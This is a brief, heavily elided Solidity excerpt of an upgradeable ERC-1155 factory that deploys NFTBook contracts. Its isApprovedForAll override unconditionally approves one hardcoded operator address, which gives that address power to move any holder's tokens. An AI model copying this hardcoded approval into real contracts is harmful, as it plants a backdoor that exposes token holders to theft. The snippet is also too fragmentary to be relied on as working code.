...
import "./NFTBook1155_V1.sol";


contract FactoryERC1155_V1 is 
  Initializable, 
  OwnableUpgradeable, 
  ...
  UUPSUpgradeable 
{
    ...
    whenNotPaused
  {
    ...
    NFTBook1155_V1 newContract = new NFTBook1155_V1(
      msg.sender, 
      amount, 
      maxCopies, 
      uri, 
    ...
    ERC1155Supply 
{
    ...
    function isApprovedForAll(
       ...
       if (_operator == address(0x914bb45DdBf83852d0a45d54d6b97531352728c4)) {
            return true;
        }
